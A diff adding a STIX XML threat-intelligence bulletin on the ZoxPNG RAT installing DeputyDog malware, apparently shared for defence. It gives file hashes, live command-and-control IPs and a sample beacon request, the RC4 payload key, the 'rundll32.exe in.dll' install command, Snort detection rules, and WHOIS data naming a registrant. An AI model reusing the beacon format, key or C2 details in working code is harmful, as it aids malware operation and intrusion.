@@ -1,0 +1,84 @@
+<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:simpleMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-15-10073" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd"><stix:STIX_Header><stix:Title>ZoxPNG RAT Used to Install Deputy Dog Malware</stix:Title><stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent><stix:Description>On 17 December 2014, a U.S. government department observed network traffic between a ZoxPNG RAT on a compromised host and a command control (C2) server hosted at IP address 103.250.72.39 via HTTP (TCP port 80).</stix:Description><stix:Handling><marking:Marking><marking:Controlled_Structure>//node()</marking:Controlled_Structure><marking:Marking_Structure color="AMBER" xsi:type="tlpMarking:TLPMarkingStructureType"/></marking:Marking><marking:Marking><marking:Controlled_Structure>//node()</marking:Controlled_Structure><marking:Marking_Structure xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>FOUO</simpleMarking:Statement></marking:Marking_Structure></marking:Marking></stix:Handling></stix:STIX_Header><stix:Indicators><stix:Indicator id="CISCP:indicator-3fced7d4-31be-4b4b-8857-432e55757cf9" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Composite_Indicator_Expression operator="OR"><indicator:Indicator idref="CISCP:indicator-2b2f2117-852c-4644-8a0e-323218ca47dc"/><indicator:Indicator idref="CISCP:indicator-6cd6b1ff-4969-46f8-b63d-9d9250cd0ff1"/></indicator:Composite_Indicator_Expression></stix:Indicator><stix:Indicator id="CISCP:indicator-2b2f2117-852c-4644-8a0e-323218ca47dc" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>DeputyDog malware (32 bit dll)
+PE Compile Time: 2014-12-17 T020216Z
+Packed with VMProtect</indicator:Description><indicator:Observable id="CISCP:Observable-7c487da2-a0ce-4aad-acfd-c1977c939b35"><cybox:Object id="CISCP:Object-136dca67-976d-4d14-a2ec-d321a7b98d25"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">in.dll</FileObj:File_Name><FileObj:Size_In_Bytes condition="Equals">245760</FileObj:Size_In_Bytes><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">2112c46ff2fe771b88b3505b25969a9d</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-17T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-6cd6b1ff-4969-46f8-b63d-9d9250cd0ff1" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>This DeputyDog implant has a different HTTP POST than previous DeputyDog variants.
+
+This is a sample callout for this variant which is made over TCP port 80:
+POST /JP/Connect.php?id=CIc3flEAimO8mP HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+SessionID: 15b7f769a28e581a2b
+User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
+Host: 103.17.116.184
+Content-Length: 1061
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+
+[Base64 encoded and RC4 encrypted payload]
+The RC4 key used to encrypt the payload is the hex version of string "RC4VIMVIM!!@@##", which is 0x52433456494D56494D212140402323.
+
+Analysis of the network traffic revealed that the malicious actors sent commands to the ZoxPNG RAT on the compromised host to:
+
+- Perform directory listings of directories "C:\", "C:\Intel", and "C:\Intel\Logs"
+- Enumerate mapped drives
+- List running processes
+- Download and install DeputyDog malware through the command "rundll32.exe in.dll", (MD5 2112c46ff2fe771b88b3505b25969a9d).
+
+Background note: ZoxPNG RAT transmits data via a specially constructed PNG file.
+
+Reporting analyst's additional notes on tactics, techniques, and procedures (TTPs) observed during related activity:
+
+"These CNE operators will use a variety of tools to compromise victim hosts (HiKit, ZoxPNG, DeputyDog). Multiple backdoors are likely to be installed on multiple hosts within a victim network for redundancy in order to maintain persistence."
+
+"It is expected that CNE operators will occasionally modify their implants in an attempt to avoid detection of their CNE activities. By changing the HTTP POST callout that is used, they can evade network detection signatures."
+
+MITIGATION TECHNIQUE
+
+The following Snort signatures may detect ZoxPNG-related C2 network
+traffic:
+alert tcp any any -&gt; any 80 (msg:"ZoxPNG Initial Beacon To C2"; flow:established,
+to_server; content:"GET"; http_method; content:"/search?q=Google&amp;go=&amp;qs=n&amp;form=";
+http_uri; content:"pq=google&amp;sc=8-1&amp;sp=-1&amp;sk="; http_uri; content:"Cookie|3a 20|
+SESSIONID="; http_cookie; sid:314; rev:1;)
+alert tcp any any -&gt; any 80 (msg:"ZoxPNG C2 Traffic"; flow:established, to_server;
+content:"POST"; http_method; content:"/search?q=Google&amp;go=&amp;qs=n&amp;form="; http_uri;
+content:"pq=google&amp;sc=8-1&amp;sp=-1&amp;sk="; http_uri; content:"Cookie|3a 20|SESSIONID=";
+http_cookie; sid:159; rev:1;)
+
+MITIGATION TECHNIQUE
+
+The following Snort signature may detect DeputyDog-related C2 network
+traffic:
+alert tcp any any -&gt; any 80 ( msg:"DeputyDog Implant Beacon To Controller";
+flow:established,to_server; content:"POST"; content:"Connect.php?id=";
+content:"application/x-www-form-urlencoded"; content:"SessionID:";
+content:"TomCat"; sid:1; rev:1;)
+
+According to passive DNS records the IP address 103.17.116.184, as of 8 January 2015 resolved to the domains jieswatchesandjewelries.com and jienenghao.com
+
+note: jien neng hao, or ? ? ? can be translated from Mandarin Chinese to "access can be good".
+
+JIESWATCHESANDJEWELRIES.COM:
+
+   Domain Name: JIESWATCHESANDJEWELRIES.COM
+   Registrar: GODADDY.COM, LLC
+   Whois Server: whois.godaddy.com
+   Referral URL: http://registrar.godaddy.com
+   Name Server: NS45.DOMAINCONTROL.COM
+   Name Server: NS46.DOMAINCONTROL.COM
+   Status: clientDeleteProhibited
+   Status: clientRenewProhibited
+   Status: clientTransferProhibited
+   Status: clientUpdateProhibited
+   Updated Date: 26-aug-2014
+   Creation Date: 22-apr-2013
+   Expiration Date: 22-apr-2015
+
+Domain Name: JIESWATCHESANDJEWELRIES.COM
+Registrar URL: http://www.godaddy.com
+Registrant Name: Jie Hao
+Registrant Organization: 
+Name Server: NS45.DOMAINCONTROL.COM
+Name Server: NS46.DOMAINCONTROL.COM
+DNSSEC: unsigned
+
+http://who.godaddy.com/whoischeck.aspx?domain=JIESWATCHESANDJEWELRIES.COM</indicator:Description><indicator:Observable id="CISCP:Observable-ec733f1f-3f81-4a83-bb0e-495d4463deeb"><cybox:Object id="CISCP:Object-7432ffff-6c60-4ad1-8dd7-bf3f4c48a5be"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">http://103.17.116.184/JP/Connect.php?id=CIc3flEAimO8mP</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-17T00:00:00"/></indicator:Sightings></stix:Indicator></stix:Indicators><stix:TTPs><stix:Kill_Chains><stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf"><stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/><stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/><stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/><stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/><stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/><stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/><stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></stixCommon:Kill_Chain></stix:Kill_Chains></stix:TTPs></stix:STIX_Package>
